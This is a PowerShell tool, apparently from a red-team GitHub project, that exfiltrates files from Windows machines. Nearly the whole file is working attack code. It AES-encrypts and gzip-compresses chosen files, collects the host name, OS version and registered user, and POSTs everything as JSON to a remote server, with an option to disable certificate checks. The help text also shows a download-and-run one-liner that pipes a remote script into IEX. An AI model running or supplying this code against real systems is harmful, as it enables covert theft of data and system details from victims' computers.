Function Invoke-WebExfiltration
{
    <#
        .SYNOPSIS
        PowerShell function to exfiltrate data via HTTP(s) POST request
        (with file gzip compression and AES-256 encryption)
        Author: Philipp Rieth

        .LINK
        GitHub: https://github.com/PhilippRieth/Invoke-WebExfiltration

        .PARAMETER Target
        Specifices the target URL. Needs to be http(s)://<host>:<port>/sendfile

        .PARAMETER Password
        The passworld used for data encryption

        .PARAMETER Proxy
        Proxy to use. Format: http://<proxy-IP>:<port>

        .PARAMETER Insecure
        If defined, certificate errors like mismatch or self signed will be ignored

        .EXAMPLE
        PS> IWR 'https://192.168.20.102:8000/iwe' -SkipCertificateCheck | IEX

        .EXAMPLE
        PS > IWE  .\file.bin
        [~] Target server: 'https://192.168.20.102:8000/sendfile'
        [*] Password: ********
        [+] Exfiltrating file '.\file.bin'
        [~] All done!

        .EXAMPLE
        PS> ls file* | IWE -Insecure
        [~] Target server: 'https://192.168.20.102:8000/sendfile'
        [*] Password: ********
        [+] Exfiltrating file 'C:\Users\tom\file.bin'
        [+] Exfiltrating file 'C:\Users\tom\file.bin.b64'
        [+] Exfiltrating file 'C:\Users\tom\file.bin.b64.gzip'
        [+] Exfiltrating file 'C:\Users\tom\file.bin.zip'
        [~] All done!
    #>

    [cmdletbinding()]
    [alias("IWE")]
    Param(
        [Parameter(
                Position = 0,
                Mandatory = $true,
                ValueFromPipeline = $true
        )]$File,
        [Parameter(
                Position = 1,
                Mandatory = $false
        )]
        [string]$Target = 'TARGET_PLACEHOLDER',
        [String]$Password,
        [switch]$IgnoreCertificateCheck
    )

    Begin {
        Write-Host "[~] Target server: '$target'"

        if (-Not$Password)
        {
            # $Password = Read-Host -MaskInput '[*] Password'
            $securedValue = Read-Host -AsSecureString '[*] Password'
            $bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($securedValue)
            $Password = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)

            if (-Not $Password)
            {
                Write-Host "[!] You provided an empty password! This won't work"
            }
        }

        Write-Debug "Plaintext password: '$Password'"
    }

    Process {
        if (-not (Test-Path -Path $file )){
            Write-Host "[X] Error: '$file' does not exist."
            break
        }

        if ((Get-Item $file -ErrorAction Stop) -is [System.IO.DirectoryInfo])
        {
            Write-Verbose "'$file' is a directory. Skipping..."
            return
        }

        Write-Host "[+] Exfiltrating file '$file'"

        # read file bytes and get file names
        $file_name = [System.IO.Path]::GetFileName($file)
        $file_bin = [IO.File]::ReadAllBytes($file)

        Write-Verbose "AES-256 encrypting '$file_name' (Block: 128 Bit)"

        # AES encrypt
        # Source: https://www.powershellgallery.com/packages/DRTools/4.0.3.4/Content/Functions%5CInvoke-AESEncryption.ps1
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256

        $password_sha256 = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Password))
        $aesManaged.Key = $password_sha256

        $encryptor = $aesManaged.CreateEncryptor()
        $file_bin_encrypted = $encryptor.TransformFinalBlock($file_bin, 0, $file_bin.Length)
        $file_bin_encrypted = $aesManaged.IV + $file_bin_encrypted

        # Write-Debug "Key SHA256 Dec: $($aesManaged.Key)"
        Write-Debug "Key SHA256 Hex: $([System.BitConverter]::ToString($aesManaged.Key).Replace('-', '') )"
        Write-Debug "Key length:     $( $aesManaged.KeySize ) Bit ($( $aesManaged.KeySize/8 ) Byte)"
        # Write-Debug "AES IV Dec:     $($aesManaged.IV)"
        Write-Debug "AES IV Hex:     $([System.BitConverter]::ToString($aesManaged.IV).Replace('-', '') )"
        Write-Debug "AES IV length:  $( [System.BitConverter]::ToString($aesManaged.IV).Replace('-', '').length*4 ) Bit ($( [System.BitConverter]::ToString($aesManaged.IV).Replace('-', '').length*4/8 ) Byte)"
        Write-Debug "AES-256 Bin: $([System.BitConverter]::ToString($file_bin_encrypted).Replace('-', '') )"

        # Encrypt file name
        $file_name_utf8 = [System.Text.Encoding]::UTF8.GetBytes($file)
        $file_name_encrypted = $encryptor.TransformFinalBlock($file_name_utf8, 0, $file_name_utf8.Length)
        $file_name_encrypted = $aesManaged.IV + $file_name_encrypted
        Write-Debug "AES-256 file name: $([System.BitConverter]::ToString($file_name_encrypted).Replace('-', '') )"

        # Encrypt systeminfo
        # (Get-WmiObject Win32_OperatingSystem) | Format-List *
        $si = Get-CimInstance Win32_OperatingSystem
        $sysinfo = [System.Text.Encoding]::UTF8.GetBytes("$( $si.csname ) $( $si.caption ) $( $si.version ) $( $si.RegisteredUser )")
        $sysinfo_encrypted = $encryptor.TransformFinalBlock($sysinfo, 0, $sysinfo.Length)
        $sysinfo_encrypted = $aesManaged.IV + $sysinfo_encrypted
        Write-Debug "AES-256 sysinfo: $([System.BitConverter]::ToString($sysinfo_encrypted).Replace('-', '') )"

        $aesManaged.Dispose()
        Write-Verbose "AES-256 encrypted '$file_name'"

        # Gzip compress content
        # Undo: cat LICENSE.gzip.b64 | base64 -d | gzip -d
        Write-Verbose "Gzip compressing file '$file_name'"
        # Compress Data via gzip stream
        $ms = New-Object IO.MemoryStream
        $cs = New-Object System.IO.Compression.GZipStream ($ms, [Io.Compression.CompressionMode]"Compress")
        $cs.Write($file_bin_encrypted, 0, $file_bin_encrypted.Length)
        $cs.Close()
        Write-Verbose "Compressed '$file_name'"

        # convert to base64 string
        $b64_bin_gzip = [Convert]::ToBase64String($ms.ToArray())
        $b64_filename = [Convert]::ToBase64String($file_name_encrypted)
        $b64_sysinfo = [Convert]::ToBase64String($sysinfo_encrypted)

        Write-Debug "Base64 file name: $b64_filename"
        Write-Debug "Base64 sysinfo: $b64_sysinfo"
        Write-Debug "Base64 bin: $b64_bin_gzip"
        $ms.Close()

        $body = @{
            "si" = $b64_sysinfo
            "fn" = $b64_filename
            "ct" = $b64_bin_gzip
        }

        Write-Verbose "Uploading file '$file_name'"
        $uri = [uri]::EscapeUriString($target)
        # $rest_timeout = 10

        try
        {
            if ($IgnoreCertificateCheck)
            {
                Write-Verbose "Ignoring certificate check"
                [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
            }

            $wc = new-object System.Net.WebClient
            $wc.Headers.Add('Content-Type', 'application/json')
            $response = $wc.UploadString($uri, "POST", ($body|ConvertTo-Json))

        }
        catch [System.Net.WebException]
        {
            if ($_.Exception.Status -eq 'Timeout')
            {
                Write-Host "[X] Error: Send data to server but got timeout after $rest_timeout sec. "
                break

                # ProtocolError means HTTP return code != 200 or 2*
                # Do some HTTP return code handling
            }
            elseif($_.Exception.Status -eq 'ProtocolError')
            {
                Write-Host "[X] Error: Expected HTTP return code '200' but got '$( $_.Exception.Response.StatusCode ) (HTTP $( [int]$_.Exception.Response.StatusCode ))' instead"
            }
            else
            {
                Write-Host "[X] Error: An unexcepted exception occured: $( $_.Exception.GetType().FullName )"
                Write-Host "[X] Error: Exception status: '$( $_.Exception.Status )'"
            }
        }
        catch  [System.Net.Http.HttpRequestException]
        {
            $message = $_.Exception.Message

            Write-Host "[X] Error: got exception: '$( $_.Exception.Message )'"

            if ($message -like "No connection could be made*")
            {
                Write-Host "[X] Error: Could not connect to the server. "
                break
            }
            elseif (-not$message)
            {
                Write-Host "[X] Error: Server answered but I got no HTTP(S) return code"
                Write-Host "[X] Error: This could be due to certificate error like mismatch or self signed"
                Write-Host "[X] Error: Try again with parameter '-Insecure'"
                Break
            }
            else
            {
                throw $_.Exception
            }
        }
        catch
        {
            Write-Host "[X] Error: Got an unknown, unexcpected exception: '$( $_.Exception.GetType().FullName )'"
            Write-Host "[X] Error: InnerException: '$( $_.Exception.InnerException.Response )'"
            Write-Host "[X] Error: StatusCode:  '$( $_.Exception.Response.StatusCode.value__ )'"
            Write-Host "[X] Error: StatusDescription:  '$( $_.Exception.Response.StatusDescription )'"
            Write-Host "[X] Error: I've no idea what's going on :("
            break
        }

        # Some return code handling
        if ($response.ToString() -ne 'Thanks!')
        {
            Write-Host "[X] Error: Host returned '$($response.ToString() )'"
            Write-Host "[X] Upload was not successfull. Something is wrong."
            break
        }
        else
        {
            Write-Verbose "Uploaded '$file_name'"
            Write-Verbose "Server returned message: '$($response.ToString() )'"
        }
    }

    End {
        # Write-Host "[~]"
        Write-Host "[~] All done!"
    }
}